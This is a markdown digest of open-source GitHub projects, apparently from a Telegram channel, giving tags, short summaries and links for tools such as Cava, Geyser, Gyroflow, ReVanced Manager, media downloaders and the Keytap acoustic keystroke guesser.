-> **Categories:** `#python` `#okww` `#wuthering_waves` `#wuthering_waves_hack` `#wuthering_waves_software` `#wutheringwaves` `#wuwa`
-
-This tool helps automate gameplay in "Wuthering Waves" by simulating user clicks on Windows. It doesn't read or modify game data, keeping the game fair. The tool is free, open-source, and designed for personal use only. It supports various screen resolutions and can run in the background. Users can download it from GitHub or other platforms. The benefit is that it simplifies gameplay interactions without cheating, making it easier for players to manage their game time.
-
-https://github.com/ok-oldking/ok-wuthering-waves
-
-- 🐙 **Source Code:** [https://github.com/ok-oldking/ok-wuthering-waves](https://github.com/ok-oldking/ok-wuthering-waves)
-- 👤 **Developer:** [ok-oldking](https://github.com/ok-oldking)
-
-
----
-
-### 📦 Cava
-
-> **Categories:** `#c_lang` `#alsa` `#audio_visualizer` `#freebsd` `#glsl_shaders` `#linux` `#macos` `#ncurses` `#pipewire` `#portaudio` `#pulseaudio` `#sdl2` `#sndio` `#windows`
-
-Cava is a free, open-source audio visualizer that works on Linux, FreeBSD, macOS, and Windows, letting you see music as moving bars right in your terminal or desktop window[1][3]. It’s easy to install and use, supports many audio systems, and lets you customize colors and settings. The main benefit is that it makes listening to music more fun and visually engaging, especially for people who enjoy seeing sound represented in real time, and it works on almost any computer or device[1][3][4].
-
-https://github.com/karlstav/cava
-
-- 🐙 **Source Code:** [https://github.com/karlstav/cava](https://github.com/karlstav/cava)
-- 👤 **Developer:** [karlstav](https://github.com/karlstav)
-
-
----
-
-### 📦 Spotify To Ytmusic
-
-> **Categories:** `#python`
-
-You can easily move your Spotify playlists and liked songs to YouTube Music using special tools. This helps you save time and effort by not having to rebuild your playlists manually. You can use scripts or services like TuneMyMusic to transfer your music library quickly. These tools allow you to link your Spotify and YouTube Music accounts, select what you want to transfer, and then automatically move your playlists and songs. This way, you can enjoy all your favorite music in one place on YouTube Music.
-
-https://github.com/linsomniac/spotify_to_ytmusic
-
-- 🐙 **Source Code:** [https://github.com/linsomniac/spotify_to_ytmusic](https://github.com/linsomniac/spotify_to_ytmusic)
-- 👤 **Developer:** [linsomniac](https://github.com/linsomniac)
-
-
----
-
-### 📦 Youtube Transcript Api
-
-> **Categories:** `#python` `#asr` `#captions` `#cli` `#subtitle` `#subtitles` `#transcript` `#transcripts` `#translating_transcripts` `#youtube` `#youtube_api` `#youtube_asr` `#youtube_captions` `#youtube_subtitles` `#youtube_transcript` `#youtube_transcripts` `#youtube_video`
-
-The YouTube Transcript API is a tool that helps you get the text from YouTube videos. It's fast and easy to use, saving you time compared to watching the whole video. You can use it to make subtitles, translate text, and even analyze what's being said in videos. This is helpful for content creators who want to make their videos more accessible and for researchers who need to study video content quickly. It also supports multiple languages, making it useful for a wide range of users.
-
-https://github.com/jdepoix/youtube-transcript-api
-
-- 🐙 **Source Code:** [https://github.com/jdepoix/youtube-transcript-api](https://github.com/jdepoix/youtube-transcript-api)
-- 👤 **Developer:** [jdepoix](https://github.com/jdepoix)
-
-
----
-
-### 📦 Using **aliyundrive-webdav** helps you connect your Aliyun Drive to devices that support WebDAV. This allows you to watch videos from your cloud storage directly on devices like TVs using apps like Infuse or nPlayer. It also lets you upload files, though it doesn't support instant file transfer due to WebDAV limitations. This setup is useful for streaming content without needing a middle server, making it convenient for users who want to access their cloud files easily across different devices.
-
-> **Categories:** `#rust` `#aliyundrive` `#aliyundrive_client` `#luci_app` `#openwrt_package` `#webdav_server`
-
-Using **aliyundrive-webdav** helps you connect your Aliyun Drive to devices that support WebDAV. This allows you to watch videos from your cloud storage directly on devices like TVs using apps like Infuse or nPlayer. It also lets you upload files, though it doesn't support instant file transfer due to WebDAV limitations. This setup is useful for streaming content without needing a middle server, making it convenient for users who want to access their cloud files easily across different devices.
-
-https://github.com/messense/aliyundrive-webdav
-
-- 🌐 **Official Website:** [https://github.com/messense/aliyundrive-webdav](https://github.com/messense/aliyundrive-webdav)
-
-
----
-
-### 📦 Geyser
-
-> **Categories:** `#java` `#bedrock` `#bedrock_edition` `#bedrock_to_java` `#bungee` `#fabric` `#geyser` `#geysermc` `#hacktoberfest` `#java_edition` `#minecraft` `#minecraft_bedrock_edition` `#packet` `#pe` `#protocol` `#proxy` `#spigot` `#translator` `#velocity`
-
-Geyser is a free tool that lets you play Minecraft across different versions by connecting Minecraft Java Edition servers. It works by translating data between the two game versions, enabling cross-platform play on devices like Windows, iOS, Android, and consoles. You can install it as a plugin or standalone, and it supports recent Minecraft versions. This means you can join Java servers even if you only have Bedrock Edition, expanding your multiplayer options without needing a separate Java account if you use the Floodgate plugin. It’s great for seamless crossplay but may have some minor limitations due to game differences[1][2][5].
-
-https://github.com/GeyserMC/Geyser
-
-- 🐙 **Source Code:** [https://github.com/GeyserMC/Geyser](https://github.com/GeyserMC/Geyser)
-- 👤 **Developer:** [GeyserMC](https://github.com/GeyserMC)
-
-
----
-
-### 📦 Spaghettikart
-
-> **Categories:** `#c_lang`
-
-SpaghettiKart is an unofficial PC port of Mario Kart 64 that runs smoothly on Windows, Linux, and even Nintendo Switch, offering better performance and online multiplayer, which the original N64 version lacked. You need a legal US ROM in .z64 format to use it, as the game itself doesn’t include any copyrighted assets. It supports custom mods and different graphics backends for better visuals and stability. This means you can enjoy Mario Kart 64 with improved graphics, online play, and modding options on modern devices, making the classic game more accessible and fun today[2][4].
-
-https://github.com/HarbourMasters/SpaghettiKart
-
-- 🐙 **Source Code:** [https://github.com/HarbourMasters/SpaghettiKart](https://github.com/HarbourMasters/SpaghettiKart)
-- 👤 **Developer:** [HarbourMasters](https://github.com/HarbourMasters)
-
-
----
-
-### 📦 Bilitools
-
-> **Categories:** `#typescript` `#bilibili` `#download` `#rust` `#tauri_app` `#vue`
-
-BiliTools is a tool that helps you download and manage content from Bilibili. It supports downloading videos, audio, music, and subtitles in various formats. You can also use it to parse historical and real-time comments, and it includes AI summary features. The tool is easy to install on Windows and macOS and supports multiple languages. It's free and open-source, making it a convenient option for users who want to manage their Bilibili content efficiently. This tool benefits users by simplifying the process of accessing and organizing Bilibili resources.
-
-https://github.com/btjawa/BiliTools
-
-- 🐙 **Source Code:** [https://github.com/btjawa/BiliTools](https://github.com/btjawa/BiliTools)
-- 👤 **Developer:** [btjawa](https://github.com/btjawa)
-
-
----
-
-### 📦 Gyroflow
-
-> **Categories:** `#rust` `#fpv` `#gopro` `#gpu` `#gpu_computing` `#gyroscope` `#insta360` `#rolling_shutter_undistortion` `#sony_alpha_cameras` `#stabilization` `#video` `#video_processing` `#Interesting` `#Useful`
-
-Gyroflow is a powerful video stabilization software that uses gyroscope data from cameras like GoPro, Sony, and Insta360 to make your videos smooth and steady. It corrects lens distortion, rolling shutter effects, and can even level the horizon for a professional look. You can preview changes in real-time, use GPU acceleration for fast processing, and apply stabilization directly in popular video editors with plugins. It supports many video formats and works on Windows, Mac, Linux, Android, and iOS. Using Gyroflow helps you create high-quality, cinematic videos without bulky equipment or complicated setups[1][3][5].
-
-https://github.com/gyroflow/gyroflow
-
-- 🐙 **Source Code:** [https://github.com/gyroflow/gyroflow](https://github.com/gyroflow/gyroflow)
-- 👤 **Developer:** [gyroflow](https://github.com/gyroflow)
-
-
----
-
-### 📦 Revanced Manager
-
-> **Categories:** `#dart` `#android` `#flutter` `#flutter_apps` `#manager` `#modding` `#patching` `#revanced` `#Interesting` `#YouTube`
-
-ReVanced Manager is an app for Android that lets you customize and patch other apps, like YouTube, to remove ads and add features without needing subscriptions. It is easy to use, works on both rooted and non-rooted devices, and offers many options to tailor apps to your liking. You download the official app, then apply patches you want, creating a personalized, ad-free experience. This saves you money and improves app use while staying legal and supported by an active community. It is lightweight, regularly updated, and has a simple interface, making app customization safe and convenient[1][3][5].
-
-https://github.com/ReVanced/revanced-manager
-
-- 🐙 **Source Code:** [https://github.com/ReVanced/revanced-manager](https://github.com/ReVanced/revanced-manager)
-- 👤 **Developer:** [ReVanced](https://github.com/ReVanced)
-
-
----
-
-### 📦 Tonzhon Music
-
-> **Categories:** `#javascript` `#antd` `#music` `#music_player` `#nodejs` `#react` `#react_router` `#redux` `#webapp` `#webpack`
-
-Copper Bell is a free website app focused on listening to music. It offers many songs and has a simple, clean design that makes it easy to find and play your favorite music. You can search for songs, make playlists, read scrolling lyrics, save songs, and create your own song lists. It does not have live broadcasts, social features, or ads, so there are no distractions and you get a pure music experience. You can use it on any modern web browser without installing anything. It works on many devices, including tablets. This way, you can enjoy music, manage your songs, and discover new tunes easily anytime and anywhere.
-
-https://github.com/enzeberg/tonzhon-music
-
-- 🐙 **Source Code:** [https://github.com/enzeberg/tonzhon-music](https://github.com/enzeberg/tonzhon-music)
-- 👤 **Developer:** [enzeberg](https://github.com/enzeberg)
-
-
----
-
-### 📦 Gt New Horizons Modpack
-
-> **Categories:** `#python` `#gregtech` `#minecraft` `#modpack` `#quests` `#thaumcraft`
-
-GT New Horizons is a very large and challenging Minecraft modpack focused on GregTech, offering a deep, progressive experience starting from the Stone Age and advancing through technology tiers like steam and electricity, eventually exploring other planets and dimensions. It includes over 3000 quests that guide you through complex tech, magic, and exploration, making the game feel like one connected adventure rather than separate mods. The pack features realistic world generation, tough survival conditions, and a mix of technology and magic mods, providing a long-lasting, rewarding gameplay for players who enjoy expert-level challenges and detailed crafting systems[1][2][3]. This benefits you by offering a rich, immersive Minecraft experience that grows with your skills and keeps you engaged for a long time.
-
-https://github.com/GTNewHorizons/GT-New-Horizons-Modpack
-
-- 🐙 **Source Code:** [https://github.com/GTNewHorizons/GT-New-Horizons-Modpack](https://github.com/GTNewHorizons/GT-New-Horizons-Modpack)
-- 👤 **Developer:** [GTNewHorizons](https://github.com/GTNewHorizons)
-
-
----
-
-### 📦 Tiktok Youtube Douyin Handling
-
-> **Categories:** `#javascript` `#douyin` `#douyin_download` `#tiktok` `#tiktok_api` `#tiktok_downloader` `#youtube`
-
-You can use a tool that lets you download TikTok, Douyin, and YouTube videos without watermarks, and even repost them across these platforms automatically. It requires setting up Python, Node.js, and some libraries, plus a MongoDB database to store videos. The tool supports video preview, downloading, and reposting with automated login via Selenium. You can schedule video scraping every 4 hours to keep content fresh. This helps you easily collect, manage, and share high-quality videos without watermarks, saving time and effort if you want to republish or analyze popular short videos from these platforms.
-
-https://github.com/lonerge/tiktok_youtube_douyin_handling
-
-- 🐙 **Source Code:** [https://github.com/lonerge/tiktok_youtube_douyin_handling](https://github.com/lonerge/tiktok_youtube_douyin_handling)
-- 👤 **Developer:** [lonerge](https://github.com/lonerge)
-
-
----
-
-### 📦 Vst3Sdk
-
-> **Categories:** `#cmake` `#audio` `#ios` `#linux` `#macos` `#plugins` `#sdk` `#vst3` `#win32`
-
-VST 3 is an improved version of the VST audio plug-in interface. It offers several benefits, including better performance by only processing audio when needed, dynamic input/output configurations, and precise automation. Users can also enjoy a more organized interface and support for advanced audio features like 3D sound. These improvements make it easier for developers to create plugins and for users to work with them in digital audio workstations (DAWs), enhancing overall audio production efficiency.
-
-https://github.com/steinbergmedia/vst3sdk
-
-- 🐙 **Source Code:** [https://github.com/steinbergmedia/vst3sdk](https://github.com/steinbergmedia/vst3sdk)
-- 👤 **Developer:** [steinbergmedia](https://github.com/steinbergmedia)
-
-
----
-
-### 📦 Xiaomusic
-
-> **Categories:** `#python` `#docker` `#docker_compose` `#music` `#pdm` `#vue` `#xiaoai` `#xiaoai_speaker` `#xiaomi` `#xiaomusic`
-
-XiaoMusic lets you play any music on your XiaoAI speaker using simple voice commands. You can install it easily with Docker or pip, then connect it to your Xiaomi account through a web interface. It downloads songs automatically and supports many formats. This means you can enjoy unlimited music, create playlists, and control playback hands-free, making your speaker much more powerful and flexible.
-
-https://github.com/hanxi/xiaomusic
-
-- 🐙 **Source Code:** [https://github.com/hanxi/xiaomusic](https://github.com/hanxi/xiaomusic)
-- 👤 **Developer:** [hanxi](https://github.com/hanxi)
-
-
----
-
-### 📦 Chef
-
-> **Categories:** `#typescript` `#GitHub` `#OpenSource`
-
-Chef by Convex is an AI tool that builds complete web apps with backend features included, like a built-in database, easy user login, file uploads, real-time updates, and background tasks, all without complex setup. It uses Convex, a reactive backend platform, to handle everything smoothly and automatically. This means you can quickly create apps like social platforms or multiplayer games that work live and update instantly. You can try Chef online or run it locally, and it supports adding your own AI model keys for code generation. This saves you time and effort by automating both frontend and backend development in one place.
-
-https://github.com/get-convex/chef
-
-- 🐙 **Source Code:** [https://github.com/get-convex/chef](https://github.com/get-convex/chef)
-- 👤 **Developer:** [get-convex](https://github.com/get-convex)
-
-
----
-
-### 📦 Music You
-
-> **Categories:** `#typescript` `#electron` `#material_you` `#music` `#music_player` `#netease_cloud_music` `#react` `#reactjs`
-
-Music You is a free desktop music player that lets you enjoy all the features of NetEase Cloud Music on your computer, with a modern, easy-to-use design that follows Google’s Material You style. You can log in with your phone, browse recommendations, manage your music library, listen to podcasts and radio, see lyrics (including word-by-word highlights), play local files, and access your cloud music. The app is built with React and Electron, works on Windows, macOS, and Linux, and is open source—so you can even download and modify the code yourself. This gives you a smooth, full-featured music experience right on your desktop, with regular updates and a clean, customizable interface.
-
-https://github.com/GuMengYu/music-you
-
-- 🐙 **Source Code:** [https://github.com/GuMengYu/music-you](https://github.com/GuMengYu/music-you)
-- 👤 **Developer:** [GuMengYu](https://github.com/GuMengYu)
-
-
----
-
-### 📦 Ytpro
-
-> **Categories:** `#javascript` `#gemini` `#generative_ai` `#node_ytdl_core` `#youtube` `#youtube_adblock` `#youtube_dislikes` `#youtube_downloader` `#youtube_downloader_android` `#youtube_player` `#youtube_vanced` `#yt_adskip` `#yt_dlp` `#yt_viewer` `#yt_views_bot` `#ytdl` `#ytdl_core` `#ytpro` `#GitHub` `#OpenSource`
-
-YT Pro is a tiny 50KB Android app that enhances YouTube with video/shorts/thumbnail/caption downloads, ad blocking, sponsor skipping, background play, PiP mode, dislike counts, Gemini AI video summaries, and auto-updates. Download the ZIP easily for quick install. It saves you time and data by blocking ads, downloading content offline, customizing playback with gestures, and summarizing long videos instantly for better productivity.
-
-https://github.com/prateek-chaubey/YTPro
-
-- 🐙 **Source Code:** [https://github.com/prateek-chaubey/YTPro](https://github.com/prateek-chaubey/YTPro)
-- 👤 **Developer:** [prateek-chaubey](https://github.com/prateek-chaubey)
-
-
----
-
-### 📦 Qualityscaler
-
-> **Categories:** `#python` `#amd` `#anime` `#compression_artifact_reduction` `#deep_learning` `#directx_12` `#gui_application` `#intel` `#manga` `#noise_reduction` `#nvidia` `#onnx` `#onnxruntime` `#opencv` `#python3` `#pytorch` `#super_resolution` `#video` `#video_processing` `#windows` `#GitHub` `#OpenSource`
-
-QualityScaler is a free Windows AI app that upscales, enhances, and denoises your images and videos with a simple drag-and-drop GUI. It supports formats like JPG, PNG, MP4, MKV; works offline on any DirectX12 GPU (4GB+ VRAM, 8GB RAM); and offers features like multi-GPU use, resize, interpolation, and stop/resume. Download from itch.io, Steam, or GitHub. Benefit: Quickly turn low-quality photos/videos into sharp HD masterpieces privately on your PC, saving time and money vs. online tools.
-
-https://github.com/Djdefrag/QualityScaler
-
-- 🐙 **Source Code:** [https://github.com/Djdefrag/QualityScaler](https://github.com/Djdefrag/QualityScaler)
-- 👤 **Developer:** [Djdefrag](https://github.com/Djdefrag)
-
-
----
-
-### 📦 Zerobot Plugin
-
-> **Categories:** `#go` `#coolq` `#cqhttp` `#cqhttp_mirai` `#go_cqhttp` `#golang` `#group_manager` `#mirai` `#mirai_bot` `#nonebot` `#onebot` `#onebot_plugin` `#onebot_sdk` `#plugin` `#qq` `#qq_bot` `#qqbot` `#qqrobot` `#websocket` `#zerobot`
-
-ZeroBot-Plugin is a comprehensive utility plugin collection for the ZeroBot chatbot framework, offering over 100 features across entertainment, management, and productivity categories. The system provides high-priority functions like chat management, sleep tracking, and group administration, alongside mid-tier features such as image generation, music streaming, and game simulations. Users benefit from flexible plugin control—enabling or disabling specific features per group—and dynamic loading capabilities that reduce program size. The platform supports multiple deployment methods, from pre-compiled releases to local compilation, making it accessible whether you prefer ready-to-use binaries or customized builds. With extensive command options, scheduled task triggers, and AI integration, ZeroBot-Plugin transforms group chat management into an automated, entertaining experience while maintaining user control over which features activate in specific communities.
-
-https://github.com/FloatTech/ZeroBot-Plugin
-
-- 🐙 **Source Code:** [https://github.com/FloatTech/ZeroBot-Plugin](https://github.com/FloatTech/ZeroBot-Plugin)
-- 👤 **Developer:** [FloatTech](https://github.com/FloatTech)
-
-
----
-
-### 📦 Widelands
-
-> **Categories:** `#cplusplus` `#apple_silicon` `#bsd` `#c_plus_plus` `#cmake` `#floss` `#game` `#gplv2` `#json` `#linux` `#lua` `#macos_app` `#python` `#strategy` `#windows` `#GitHub` `#OpenSource`
-
-Widelands is a free, open-source real-time strategy game like Settlers II, where you lead a small clan to build roads, gather resources like wood and gold, manage four unique tribes, trade, or fight in single-player campaigns and multiplayer. Download it easily for Windows, Mac, or Linux, or compile from source with simple scripts and tools like CMake on various systems. This lets you enjoy deep, replayable empire-building fun at no cost, anytime with friends or AI.
-
-https://github.com/widelands/widelands
-
-- 🐙 **Source Code:** [https://github.com/widelands/widelands](https://github.com/widelands/widelands)
-- 👤 **Developer:** [widelands](https://github.com/widelands)
-
-
----
-
-### 📦 Gamdl
-
-> **Categories:** `#python` `#4k` `#aac` `#apple_music` `#apple_music_downloader` `#downloader` `#m4a` `#m4v` `#GitHub` `#OpenSource`
-
-Gamdl is a free command-line tool to download Apple Music songs in high-quality AAC 256kbps, music videos up to 4K, albums, playlists, and artist content, with synced lyrics (LRC/SRT), rich metadata, and cover art. Install via `pip install gamdl`, add your browser cookies from an active subscription, and run `gamdl [URL]`. It benefits you by letting you enjoy offline playback anywhere without streaming data costs, on any device, with organized files ready for your library.
-
-https://github.com/glomatico/gamdl
-
-- 🐙 **Source Code:** [https://github.com/glomatico/gamdl](https://github.com/glomatico/gamdl)
-- 👤 **Developer:** [glomatico](https://github.com/glomatico)
-
-
----
-
-### 📦 Foobox Cn
-
-> **Categories:** `#javascript` `#GitHub` `#OpenSource`
-
-foobox is a sleek, customizable skin for foobar2000 music player that uses JSplitter for smooth layouts, lyrics, spectrum analyzer, playlists, covers, search, and online radio. Download the free Chinese version package from latest Releases—it works on 32/64-bit, installs green without the base app, and lets you switch layouts via Main Menu > View > Layout > Quick Setup. You get a modern, feature-rich interface that runs fast, giving full control over your music library for better listening.
-
-https://github.com/dream7180/foobox-cn
-
-- 🐙 **Source Code:** [https://github.com/dream7180/foobox-cn](https://github.com/dream7180/foobox-cn)
-- 👤 **Developer:** [dream7180](https://github.com/dream7180)
-
-
----
-
-### 📦 Android Foss
-
-> **Categories:** `#python` `#android` `#android_apps` `#f_droid` `#foss` `#free_and_op` `#free_and_open_source` `#izzyondroid` `#open_source` `#opensource` `#GitHub`
-
-This list offers free open-source Android apps for every need—from browsers, cameras, and music players to games, tools, and F-Droid stores like Neo-Store. Get them via F-Droid or IzzyOnDroid for no ads or tracking. It boosts your privacy and freedom by ditching Google apps, letting you control your data and phone fully.
-
-https://github.com/offa/android-foss
-
-- 🐙 **Source Code:** [https://github.com/offa/android-foss](https://github.com/offa/android-foss)
-- 👤 **Developer:** [offa](https://github.com/offa)
-
-
----
-
-### 📦 Ytlite
-
-> **Categories:** `#logos` `#downloader` `#ios` `#jailbreak` `#sponsorblock` `#tweak` `#youtube`
-
-YouTube Plus enhances the iOS YouTube app with over 100 options like downloading videos/audio/thumbnails, copying info, customizing interfaces (remove feeds, OLED mode), player gestures, built-in SponsorBlock, and tweaks for 4K, PiP, dislikes, and quality selector. Build your custom version via GitHub Actions using a decrypted YouTube IPA—fork the repo, run the workflow, select tweaks, and download from releases (last free v5.2b4). This gives you a tailored, ad-free experience with premium features for better viewing and saving content.
-
-https://github.com/dayanch96/YTLite
-
-- 🐙 **Source Code:** [https://github.com/dayanch96/YTLite](https://github.com/dayanch96/YTLite)
-- 👤 **Developer:** [dayanch96](https://github.com/dayanch96)
-
-
----
-
-### 📦 Pixelle Video
-
-> **Categories:** `#python` `#aigc` `#comfyui` `#image_generation` `#tts` `#video_generation` `#GitHub` `#OpenSource`
-
-Pixelle-Video is an AI tool that fully automates short video creation: input a theme, and it writes scripts, generates images/videos, adds voiceovers, music, and compiles the final clip—no editing skills needed. Recent updates include action transfer, multi-language TTS, and custom uploads for personalized results. Download the Windows package or install via source for easy web use with free local options. You benefit by quickly making pro videos for social media or content, saving hours of manual work and costs.
-
-https://github.com/AIDC-AI/Pixelle-Video
-
-- 🐙 **Source Code:** [https://github.com/AIDC-AI/Pixelle-Video](https://github.com/AIDC-AI/Pixelle-Video)
-- 👤 **Developer:** [AIDC-AI](https://github.com/AIDC-AI)
-
-
----
-
-### 📦 Nethack
-
-> **Categories:** `#c_lang` `#c` `#game` `#roguelike`
-
-NetHack 5.0.0 is an updated dungeon exploration game that improves on previous versions with better code quality, easier cross-platform building, and new features like automatic annotations for key locations. The update uses modern C99 programming standards and replaces older compilation tools with faster Lua-based alternatives that work during gameplay. Players benefit from a more stable, efficient game that runs smoothly across different computers and operating systems, plus new gameplay enhancements that make exploration clearer and more enjoyable.
-
-https://github.com/NetHack/NetHack
-
-- 🐙 **Source Code:** [https://github.com/NetHack/NetHack](https://github.com/NetHack/NetHack)
-- 👤 **Developer:** [NetHack](https://github.com/NetHack)
-
-
----
-
-### 📦 Moss Tts
-
-> **Categories:** `#python` `#audio` `#audio_tokenizer` `#llm` `#multimodal` `#text_to_speech` `#voice_cloning` `#GitHub` `#OpenSource`
-
-MOSS-TTS is an open-source family of speech and sound models for natural, high-quality audio generation, including voice cloning, multi-speaker dialogue, real-time speech, and sound effects. It supports 31 languages in v1.5, better voice stability, and pause control, and it also offers a lightweight Nano version that can run on 4 CPU cores. The benefit to you is simple: you can create realistic speech or sound for apps, demos, or products with strong quality, flexible control, and multiple ways to run it.
-
-https://github.com/OpenMOSS/MOSS-TTS
-
-- 🐙 **Source Code:** [https://github.com/OpenMOSS/MOSS-TTS](https://github.com/OpenMOSS/MOSS-TTS)
-- 👤 **Developer:** [OpenMOSS](https://github.com/OpenMOSS)
-
-
----
-
-### 📦 Social Auto Upload
-
-> **Categories:** `#python` `#bilibili` `#douyin` `#tiktok` `#xiaohongshu` `#youtube`
-
-This tool helps you upload videos and schedule posts to major platforms like Douyin, Bilibili, Xiaohongshu, Kuaishou, WeChat Channels, Baijiahao, and TikTok from one place. It saves you time by automating repetitive posting work, so you can manage more accounts with less manual effort and focus more on creating content.
-
-https://github.com/dreammis/social-auto-upload
-
-- 🐙 **Source Code:** [https://github.com/dreammis/social-auto-upload](https://github.com/dreammis/social-auto-upload)
-- 👤 **Developer:** [dreammis](https://github.com/dreammis)
-
-
----
-
-### 📦 Mimesis
-
-> **Categories:** `#Python` `#Security` `#Interesting` `#Media` `#GitHub` `#OpenSource`
-
-Can be used to create test databases, data in JSON or XML format
-
-[GitHub](https://t.me/github_community) | #Python #Security #Interesting
-
-- 🐙 **Source Code:** [https://github.com/lk-geimfari/mimesis](https://github.com/lk-geimfari/mimesis)
-- 👤 **Developer:** [lk-geimfari](https://github.com/lk-geimfari)
-
-
----
-
-### 📦 Kbd Audio
-
-> **Categories:** `#Cpp` `#Audio` `#Interesting` `#spy`
-
-**Keytap** – A very interesting tool, it can guess the keys pressed on the keyboard only by analyzing the sound captured from the computer microphone.
-
-__"This is what mechanical keyboard users deserve" - random comment__
-
-• [**Detailed description**](https://ggerganov.github.io/jekyll/update/2018/11/30/keytap-description-and-thoughts.html)
-• [**Video: short demonstration of Keytap in action**](https://www.youtube.com/watch?v=2OjzI9m7W10)
-
-**Keytap2 – **another interesting tool for restoring text from audio. It does not require training data - instead it uses statistical information about letter and n-gram frequencies in English.
-
-• [**More detailed description of the tool**](https://github.com/ggerganov/kbd-audio/discussions/31)
-
-[GitHub](https://t.me/github_community) | #Cpp #Audio #Interesting
-
-- 🐙 **Source Code:** [https://github.com/ggerganov/kbd-audio](https://github.com/ggerganov/kbd-audio)
-- 👤 **Developer:** [ggerganov](https://github.com/ggerganov)
-
-
----
-
-### 📦 Pytube
-
-> **Categories:** `#Python` `#Video` `#Interesting` `#Useful`
-
-Pytube also allows you to specify callback functions for various loading events such as progress or completion
-
-Additionally, pytube includes a command line utility that allows you to download videos directly from the terminal
-
-[GitHub](https://t.me/github_community) | #Python #Video #Interesting #Useful
-
-- 🐙 **Source Code:** [https://github.com/pytube/pytube](https://github.com/pytube/pytube)
-- 👤 **Developer:** [pytube](https://github.com/pytube)
-
-
----
-
-### 📦 Boardgame.Io
-
-> **Categories:** `#TypeScript` `#Game` `#Engine`
-
-By writing a few simple functions that describe how the game's state changes when a certain action is taken, you can program a game script that automatically translates into a playable program without requiring you to write a single line of networking or storage code.__
-
-**Features**:
-• __State management
-• Multiplayer game
-• AI: Generated bots that can play your game.
-• Customize game phases: with different game rules and turn order.
-• Lobby: selection of games, players.
-• Prototyping: An interface for simulating moves before the actual game rendering process.
-• A plugin system that allows you to create new abstractions.
-
-__[GitHub](https://t.me/github_community) | #TypeScript #Game #Engine
-
-- 🐙 **Source Code:** [https://github.com/boardgameio/boardgame.io](https://github.com/boardgameio/boardgame.io)
-- 👤 **Developer:** [boardgameio](https://github.com/boardgameio)
-
-
----
-
-### 📦 Youtube Extension
-
-> **Categories:** `#JavaScript` `#Extension` `#Browser` `#Useful` `#GitHub` `#OpenSource`
-
-With ImprovedTube you can set a constant player size, make playlists play in reverse, set a constant playback speed or fix video quality and many other options.
-
-**⤷** [Website](http://improvedtube.com/)
-
-[GitHub](https://t.me/github_community) | #JavaScript #Extension #Browser #Useful
-
-- 🐙 **Source Code:** [https://github.com/code4charity/YouTube-Extension](https://github.com/code4charity/YouTube-Extension)
-- 👤 **Developer:** [code4charity](https://github.com/code4charity)
-
-
----
-
-### 📦 Dfspot Deepfake Recognition
-
-> **Categories:** `#Python` `#Interesting` `#Video` `#Neural` `#Network` `#osint`
-
-⤷ Ссылка на [Google Colab](https://colab.research.google.com/drive/1s0e0OO_Xcyw7S81s8GydTDtTQXJvJPpL?usp=sharing)
-
-[GitHub](https://t.me/github_community) | #Python #Interesting #Video #Neural #Network
-
-- 🐙 **Source Code:** [https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition](https://github.com/chinmaynehate/DFSpot-Deepfake-Recognition)
-- 🌐 **Official Website:** [https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc](https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc)
-- 👤 **Developer:** [chinmaynehate](https://github.com/chinmaynehate)
-
-
----
-
-### 📦 Shotcut
-
-> **Categories:** `#Cpp` `#Video` `#Editor`
-
-**
-A nice feature is the absence of various restrictions: resolution, time, lack of watermarks or additional payment functions.
-
-[GitHub](https://t.me/github_community) | #Cpp #Video #Editor
-
-- 🐙 **Source Code:** [https://github.com/mltframework/shotcut](https://github.com/mltframework/shotcut)
-- 👤 **Developer:** [mltframework](https://github.com/mltframework)
-
-
----
-
-### 📦 Spicetify Cli
-
-> **Categories:** `#JavaScript` `#Useful` `#Interesting` `#Linux` `#MacOS`
-
-__**Features:**
-• Ability to change the color of the entire user interface
-• CSS for advanced customization
-• Ability to connect other extensions (JavaScript scripts) to manipulate the user interface and control the player
-• Ability to remove bloated components to improve performance
-
-⤷ [Project link](https://github.com/khanhas/spicetify-cli)
-
-[GitHub](https://t.me/github_community) | #JavaScript #Useful
-
-- 🐙 **Source Code:** [https://github.com/khanhas/spicetify-cli](https://github.com/khanhas/spicetify-cli)
-- 👤 **Developer:** [khanhas](https://github.com/khanhas)
-
-
----
-
-### 📦 Dragon Userbot
-
-> **Categories:** `#custom` `#Python` `#Telegram` `#Userbot` `#GitHub` `#OpenSource`
-
-How it works:** the script is tied to a user account (authorization in tg by phone number) and catches commands from this user.
-
-**How ​​to use: **if you write `.ban` in a chat and reply to a message, the author of this message will be banned (provided that you are an admin), there is also a module for playing music in voice chat and many other useful modules, the full list is available using the `.help` command, as well as [here](https://t.me/Dragon_Userbot_chat/35275).
-Brief documentation has been written for each module, available using the command `.help module_name
-
-`__Suggest your own or another interesting project: ____@mintotii__`
-`[GitHub](https://t.me/github_community) | #Python #Telegram #Userbot
-
-- 🐙 **Source Code:** [https://github.com/Dragon-Userbot/Dragon-Userbot](https://github.com/Dragon-Userbot/Dragon-Userbot)
-- 👤 **Developer:** [Dragon-Userbot](https://github.com/Dragon-Userbot)
-
-
----
-
-### 📦 Stemroller
-
-> **Categories:** `#Interesting` `#Audio` `#Music`
-
-Just enter the song name into the search bar - StemRoller will find the song on YouTube and divide it into four groups: vocals, drums, bass and everything else
-
-⤷ [Project link](https://github.com/stemrollerapp/stemroller)
-
-[GitHub](https://t.me/github_community) | #Interesting #Audio #Music
-
-- 🐙 **Source Code:** [https://github.com/stemrollerapp/stemroller](https://github.com/stemrollerapp/stemroller)
-- 👤 **Developer:** [stemrollerapp](https://github.com/stemrollerapp)
-
-
----
-
-### 📦 Remotevideocam
-
-> **Categories:** `#Interesting` `#Android` `#Video` `#Useful`
-
-The application can be used to monitor things in the house or yard, as a walkie-talkie, etc.
-
-⤷ [Project link](https://github.com/izivkov/RemoteVideoCam)
-
-[GitHub](https://t.me/github_community) | #Interesting #Android #Video #Useful
-
-- 🐙 **Source Code:** [https://github.com/izivkov/RemoteVideoCam](https://github.com/izivkov/RemoteVideoCam)
-- 👤 **Developer:** [izivkov](https://github.com/izivkov)
-
-
----
-
-### 📦 Gifcurry
-
-> **Categories:** `#ElectronFree` `#Interesting` `#Video` `#Haskel`
-
-Gifcurry is 100% #ElectronFree
-“No need to load more RAM”
-
-⤷ [Project link](https://github.com/lettier/gifcurry)
-
-[GitHub](https://t.me/+odUTRyjOxj41NjY6) | #Interesting #Video #Haskel
-
